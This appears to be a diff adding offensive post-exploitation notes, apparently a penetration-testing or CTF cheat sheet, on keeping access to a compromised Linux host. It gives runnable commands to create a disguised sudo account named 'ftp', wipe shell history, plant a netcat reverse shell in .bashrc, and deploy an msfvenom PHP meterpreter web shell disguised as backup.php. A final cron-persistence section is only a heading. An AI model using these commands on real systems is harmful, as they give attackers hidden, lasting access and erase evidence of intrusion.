@@ -30,6 +30,94 @@ $ ssh root@10.10.10.10                            #(success!)
 
 (Technique 2) Create a privilege account user
 
+$ useradd -m -s /bin/bash ftp                      #(create a service one, not a real username = suspicious)
+$ cat /etc/passwd                                  #(see the ftp user on the list)
+$ cat /etc/sudoers
+$ usermod -aG sudo ftp
+$ groups ftp                                       #(ftp in the sudo group)
+$ passwd ftp                                       #(create passwd ftp)
+$ su ftp
+
+Clear History
+
+$ history
+$ ls -al ~/
+$ history -c
+$ cat .bash_history
+$ cat /dev/null > /root/.bash_history
+$ cat .bash_history                                #(history completely erased)
+
+
+(Technique 3) Configure a UNIX shell (root & user (more quiet))
+
+
+$ nano .bashrc
+   - add nc -e /bin/bash 10.10.10.10 1234 2>/dev/null &
+
+$ nc -nvlp 1234
+
+$ ssh@10.10.10.10
+
+$ nc -nvlp 1234
+    - id
+    - uid=0(root)
+
+
+(Technique 4) Set up a web shell backdoor
+
+
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST 10.10.10.10 LPORT 4444 -e php/base64 -f raw > backup.php
+
+#(nano backup.php and add the php brackets <?php JBUCVUQBUIB87643jkvhbjhv ?> and save it)
+
+$ sudo python -m SimpleHTTPServer 80 ...
+
+$ /var/www/html $ wget 10.10.10.10/backup.php
+$ sudo chmod +x backup.php
+
+msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.10.10
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > run
+  - Started reverse TCP ...
+  
+#(Go to http://10.10.10.10/backup.php)
+
+meterpreter >  whoami
+
+
+(Technique 5) Setup Persistance w/ cronjobs
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
